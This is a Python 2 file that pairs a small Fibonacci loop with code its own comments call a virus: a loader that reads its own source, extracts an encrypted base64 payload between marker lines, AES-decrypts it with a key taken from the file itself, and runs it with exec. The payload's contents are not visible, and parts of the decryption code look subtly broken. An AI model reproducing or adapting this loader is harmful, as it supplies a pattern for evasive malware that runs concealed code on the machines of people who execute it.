parents, babies = (1, 1)
while babies < 100:
    print 'This generation has {0} babies'.format(babies)
    parents, babies = (babies, parents + babies)

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload